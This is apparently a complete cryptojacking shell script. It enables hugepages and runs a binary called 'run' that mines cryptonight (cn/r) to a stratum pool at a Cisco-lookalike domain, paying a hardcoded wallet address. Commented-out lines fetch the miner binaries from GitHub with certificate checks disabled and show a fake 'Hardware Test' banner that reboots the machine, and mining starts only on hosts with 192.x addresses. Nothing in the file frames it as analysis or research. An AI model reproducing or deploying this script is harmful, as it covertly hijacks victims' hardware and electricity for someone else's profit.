#!/bin/sh
#190320

END="cisco.viewdns.net"
PORT="80"
USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
TAG="OSRUN"

_REBANNER(){
  clear
  echo "Hardware Test"
  echo "-------------"
  echo "Checking OK!!"
  echo ""
  echo ""
  echo "PRESS [ENTER] TO RESTART"
  read VAR
  reboot
}

_RUN(){
 case $1 in
   start)  
     #wget --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/cmd
     #wget --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/run
     #sleep 2
     #chmod +x cmd
     chmod +x run
     #sleep 2
     sysctl -w vm.nr_hugepages=128
     #sleep 2
     #./cmd -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
     ./run -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
     #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
     #_REBANNER
   ;; 
 esac
}

#(
#sleep 60
#killall run
#)&

if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
_RUN start
fi
